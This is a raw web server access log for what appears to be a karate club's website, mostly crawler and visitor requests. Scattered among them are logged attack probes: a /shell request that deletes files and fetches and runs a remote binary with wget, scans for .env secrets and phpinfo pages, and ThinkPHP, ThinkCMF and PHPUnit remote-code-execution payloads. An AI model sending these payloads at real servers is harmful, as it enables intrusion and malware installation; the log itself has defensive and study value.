::ffff:66.249.65.253 - - [13/Aug/2022:10:10:06 +0000] "GET /events HTTP/1.1" 200 8612 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.46.13.232 - - [13/Aug/2022:10:20:31 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:207.46.13.67 - - [13/Aug/2022:10:20:35 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:67.23.166.123 - - [13/Aug/2022:10:21:11 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
::ffff:219.78.80.3 - - [13/Aug/2022:10:30:31 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://77.73.131.122/bins/aqua.mpsl;sh+/tmp/aqua.mpsl HTTP/1.1" - - "-" "Hello, world"
::ffff:207.46.13.67 - - [13/Aug/2022:10:34:37 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.73.227 - - [13/Aug/2022:10:36:54 +0000] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.73.227 - - [13/Aug/2022:10:37:01 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/104.0.5112.79 Safari/537.36"
::ffff:66.249.73.231 - - [13/Aug/2022:10:37:01 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/104.0.5112.79 Safari/537.36"
::ffff:185.254.196.115 - - [13/Aug/2022:10:37:58 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [13/Aug/2022:10:38:04 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:193.118.53.194 - - [13/Aug/2022:10:44:55 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:135.125.246.110 - - [13/Aug/2022:11:07:52 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [13/Aug/2022:11:07:52 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:3.19.112.156 - - [13/Aug/2022:11:14:28 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
::ffff:106.75.246.154 - - [13/Aug/2022:11:15:48 +0000] "GET / HTTP/1.0" 200 58071 "-" "-"
::ffff:157.90.209.76 - - [13/Aug/2022:11:16:56 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:157.90.209.76 - - [13/Aug/2022:11:16:57 +0000] "GET /sitemap HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:157.90.209.76 - - [13/Aug/2022:11:17:01 +0000] "GET /sitemap.txt HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:23.90.160.122 - - [13/Aug/2022:11:18:52 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:51.222.253.3 - - [13/Aug/2022:11:22:01 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.3 - - [13/Aug/2022:11:22:02 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:66.249.65.157 - - [13/Aug/2022:11:23:35 +0000] "GET /instructors.php HTTP/1.1" 404 154 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:143.198.174.30 - - [13/Aug/2022:11:31:56 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
::ffff:107.175.3.35 - - [13/Aug/2022:11:34:28 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Python/3.7 aiohttp/3.7.4.post0"
::ffff:107.175.3.35 - - [13/Aug/2022:11:34:28 +0000] "POST / HTTP/1.1" 404 140 "-" "Python/3.7 aiohttp/3.7.4.post0"
::ffff:20.84.53.67 - - [13/Aug/2022:11:52:08 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.84.53.67 - - [13/Aug/2022:11:52:08 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [13/Aug/2022:12:07:20 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [13/Aug/2022:12:07:20 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.212.250.244 - - [13/Aug/2022:12:09:44 +0000] "GET /.env HTTP/1.1" 404 143 "-" "MMozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24"
::ffff:18.212.250.244 - - [13/Aug/2022:12:09:45 +0000] "POST / HTTP/1.1" 404 140 "-" "MMozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24"
::ffff:185.7.214.117 - - [13/Aug/2022:12:09:52 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:49.12.131.247 - - [13/Aug/2022:12:16:33 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [13/Aug/2022:12:16:35 +0000] "GET /sitemap HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [13/Aug/2022:12:16:38 +0000] "GET /sitemap.txt HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:207.46.13.67 - - [13/Aug/2022:12:24:47 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:45.140.141.234 - - [13/Aug/2022:12:25:59 +0000] "GET / HTTP/1.1" 200 58071 "-" "Linux Gnu (cow)"
::ffff:135.125.246.110 - - [13/Aug/2022:12:36:23 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [13/Aug/2022:12:36:23 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.7.214.117 - - [13/Aug/2022:12:37:16 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 189 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:207.46.13.67 - - [13/Aug/2022:12:37:19 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:43.131.66.209 - - [13/Aug/2022:12:44:43 +0000] "GET / HTTP/1.1" 200 58071 "-" "curl/7.64.1"
::ffff:209.141.51.222 - - [13/Aug/2022:12:44:57 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:209.141.51.222 - - [13/Aug/2022:12:44:57 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:66.249.65.54 - - [13/Aug/2022:12:56:58 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.56 - - [13/Aug/2022:12:56:58 +0000] "GET /signup HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.46.13.46 - - [13/Aug/2022:12:59:07 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.7.214.117 - - [13/Aug/2022:13:19:42 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:66.249.70.51 - - [13/Aug/2022:13:21:33 +0000] "GET /instructors.php HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:35.90.7.68 - - [13/Aug/2022:13:23:58 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:95.217.117.29 - - [13/Aug/2022:13:24:02 +0000] "GET /wp-content/plugins/instabuilder2/assets/css/instabuilder2.css HTTP/1.1" 404 200 "www.google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:95.217.117.29 - - [13/Aug/2022:13:24:03 +0000] "GET /wp/wp-content/plugins/instabuilder2/assets/css/instabuilder2.css HTTP/1.1" 404 203 "www.google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:95.217.117.29 - - [13/Aug/2022:13:24:04 +0000] "GET /wordpress/wp-content/plugins/instabuilder2/assets/css/instabuilder2.css HTTP/1.1" 404 210 "www.google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:95.217.117.29 - - [13/Aug/2022:13:24:05 +0000] "GET /blog/wp-content/plugins/instabuilder2/assets/css/instabuilder2.css HTTP/1.1" 404 205 "www.google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:35.91.65.81 - - [13/Aug/2022:13:24:08 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.91.65.81 - - [13/Aug/2022:13:24:10 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:207.46.13.67 - - [13/Aug/2022:13:26:34 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.196.220.70 - - [13/Aug/2022:13:27:45 +0000] "GET / HTTP/1.1" 200 58071 "-" "Linux Gnu (cow)"
::ffff:178.128.152.119 - - [13/Aug/2022:13:37:00 +0000] "GET / HTTP/1.0" 200 58071 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
::ffff:201.213.209.193 - - [13/Aug/2022:13:37:11 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:185.254.196.115 - - [13/Aug/2022:13:38:34 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [13/Aug/2022:13:38:34 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.7.214.117 - - [13/Aug/2022:13:54:07 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:132.232.75.2 - - [13/Aug/2022:14:03:19 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:157.55.39.81 - - [13/Aug/2022:14:03:58 +0000] "GET /style.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.70.122 - - [13/Aug/2022:14:04:01 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.70.122 - - [13/Aug/2022:14:04:01 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.70.122 - - [13/Aug/2022:14:04:01 +0000] "GET /students HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.70.124 - - [13/Aug/2022:14:04:02 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.70.122 - - [13/Aug/2022:14:04:02 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.70.124 - - [13/Aug/2022:14:04:02 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:135.125.246.110 - - [13/Aug/2022:14:04:40 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [13/Aug/2022:14:04:40 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.70.55 - - [13/Aug/2022:14:06:33 +0000] "GET /instructors.php HTTP/1.1" 404 154 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:23.100.232.233 - - [13/Aug/2022:14:09:34 +0000] "GET /overview.html HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
::ffff:35.92.38.131 - - [13/Aug/2022:14:14:55 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:157.55.39.81 - - [13/Aug/2022:14:14:59 +0000] "GET /style.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:35.87.116.4 - - [13/Aug/2022:14:15:56 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.87.116.4 - - [13/Aug/2022:14:15:56 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:46.161.11.238 - - [13/Aug/2022:14:19:47 +0000] "GET / HTTP/1.0" 200 58071 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36 Edg/83.0.478.25"
::ffff:46.161.11.238 - - [13/Aug/2022:14:19:49 +0000] "POST /sendemail HTTP/1.0" 302 39 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36 Edg/83.0.478.25"
::ffff:46.161.11.238 - - [13/Aug/2022:14:19:49 +0000] "GET /?msg=sent HTTP/1.0" 200 58471 "http://wadokikai.org/?msg=sent#signup" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36 Edg/83.0.478.25"
::ffff:185.7.214.117 - - [13/Aug/2022:14:19:57 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:207.46.13.67 - - [13/Aug/2022:14:27:29 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.67 - - [13/Aug/2022:14:40:31 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:5.188.210.227 - - [13/Aug/2022:14:47:59 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 147 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::ffff:130.162.169.44 - - [13/Aug/2022:15:01:35 +0000] "GET /.env HTTP/1.1" 404 143 "-" "-"
::ffff:130.162.169.44 - - [13/Aug/2022:15:01:36 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "-"
::ffff:130.162.169.44 - - [13/Aug/2022:15:01:39 +0000] "GET /phpinfo HTTP/1.1" 404 146 "-" "-"
::ffff:130.162.169.44 - - [13/Aug/2022:15:01:40 +0000] "GET /phpinfo.php HTTP/1.1" 404 150 "-" "-"
::ffff:130.162.169.44 - - [13/Aug/2022:15:01:42 +0000] "GET /info.php HTTP/1.1" 404 147 "-" "-"
::ffff:130.162.169.44 - - [13/Aug/2022:15:01:49 +0000] "GET /php.php HTTP/1.1" 404 146 "-" "-"
::ffff:130.162.169.44 - - [13/Aug/2022:15:01:49 +0000] "GET /test.php HTTP/1.1" 404 147 "-" "-"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/JohnArce.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/tm.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/books/MBS.gif HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/books/karatebook.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/books/ZenMeditation.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/books/bookoffiverings.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/books/shotokanSecrets.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/books/KarateDoZen.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/books/dummies.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/books/dojoWisdom.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/books/saibook.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/books/bobook.gif HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/books/guide20.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:24 +0000] "GET /images/books/karatedo.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:25 +0000] "GET /images/books/emptyHand.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:25 +0000] "GET /images/books/movingzen.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
